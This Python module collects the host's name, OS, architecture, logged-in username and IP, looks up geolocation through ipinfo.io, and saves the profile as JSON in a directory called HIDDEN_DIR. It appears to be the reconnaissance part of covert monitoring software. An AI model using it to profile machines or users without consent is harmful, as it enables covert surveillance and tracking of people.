import platform
import socket
import getpass
import json
import requests
import os
from config import HIDDEN_DIR, SYSINFO_FILE

def get_system_info():
    info = {
        "hostname": socket.gethostname(),
        "os": platform.system() + " " + platform.release(),
        "architecture": platform.machine(),
        "username": getpass.getuser(),
        "ip_address": socket.gethostbyname(socket.gethostname())
    }
    return info

def get_geolocation():
    try:
        response = requests.get('https://ipinfo.io/json', timeout=5)
        data = response.json()
        return {
            "ip": data.get('ip'),
            "city": data.get('city'),
            "region": data.get('region'),
            "country": data.get('country'),
            "loc": data.get('loc'),
            "org": data.get('org')
        }
    except:
        return {"error": "Could not fetch geolocation"}

def save_sysinfo():
    info = get_system_info()
    geo = get_geolocation()
    full_info = {**info, "geolocation": geo}
    filepath = os.path.join(HIDDEN_DIR, SYSINFO_FILE)
    with open(filepath, 'w') as f:
        json.dump(full_info, f, indent=4)
    return filepath